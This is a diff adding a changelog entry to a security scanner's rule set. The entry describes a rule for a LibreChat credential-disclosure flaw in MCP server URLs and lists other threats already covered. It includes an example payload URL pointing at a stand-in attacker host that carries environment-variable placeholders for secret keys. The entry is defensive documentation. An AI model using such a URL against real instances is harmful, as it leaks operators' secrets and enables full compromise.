@@ -1,5 +1,23 @@
 # SkillScan Rules Changelog
 
+## 2026.06.07.1
+
+Pattern update 2026-06-07. One new rule: PSV-093 (LibreChat env-var expansion in MCP server URL, CVE-2026-32625).
+
+- **PSV-093** (critical, new): **LibreChat server-side env-var expansion in MCP server URL — credential disclosure (CVE-2026-32625, GHSA-pmw7-gqwj-f954, CVSS 9.6, <= 0.8.3)** — CVE-2026-32625 (disclosed June 2, 2026) is a critical credential disclosure vulnerability in LibreChat <= 0.8.3. When an authenticated user configures an MCP server URL, LibreChat resolves `${VAR}` placeholders against its own `process.env` during Zod schema validation. An attacker can embed `${CREDS_KEY}`, `${CREDS_IV}`, `${JWT_SECRET}`, and `${MONGO_URI}` in the URL (e.g. `https://attacker.example/?k=${CREDS_KEY}&j=${JWT_SECRET}`); LibreChat expands these and makes an outbound request to the attacker's server with the plaintext secrets in the URL. This enables full instance compromise — decryption of stored credentials, database access, and JWT forgery. Only a low-privilege authenticated account is required. Fixed in LibreChat 0.8.4-rc1. Upgrade immediately and audit MCP server URL configurations for embedded `${...}` references.
+
+Vuln DB additions: librechat <= 0.8.3 (PSV-093, CVE-2026-32625). 1 new entry.
+IOC additions: none.
+
+Total: 322 static rules + 14 chain rules = 336.
+
+Sources:
+- PSV-093: https://github.com/danny-avila/LibreChat/security/advisories/GHSA-pmw7-gqwj-f954
+- PSV-093: https://www.thehackerwire.com/librechat-critical-credential-disclosure-via-mcp-server-url/
+- PSV-093: https://nvd.nist.gov/vuln/detail/CVE-2026-32625
+
+Candidates researched and already covered: TrapDoor (MAL-086), Miasma Phantom Gyp (SUP-058), Miasma @redhat-cloud-services (MAL-088), IronWorm (MAL-091), CVE-2026-30615 Windsurf (PSV rule), OpenClaw log poisoning GHSA-g27f-9qjv-22pm, Apache Doris MCP CVE-2025-66335, Apache Pinot MCP, Alibaba RDS MCP, Azure MCP SSRF CVE-2026-26118, Azure DevOps MCP CVE-2026-32211, Azure Data Explorer MCP CVE-2026-33980, Splunk MCP CVE-2026-20205, LibreChat STDIO RCE CVE-2026-22252, MCP Inspector CVE-2025-49596, CanisterWorm (MAL rule), Trivy supply chain (existing rule), Mini Shai-Hulud waves 1-7, Checkmarx Jenkins CVE-2026-33634 (SUP-057), codexui-android (MAL-090), PackageGate CVE-2025-69264.
+
 ## 2026.06.06.1
 
 Pattern update 2026-06-06. Three new rules: MAL-090 (codexui-android Codex token stealer), SUP-058 (Miasma Phantom Gyp @vapi-ai/server-sdk wave), MAL-091 (IronWorm Rust/eBPF npm attack).
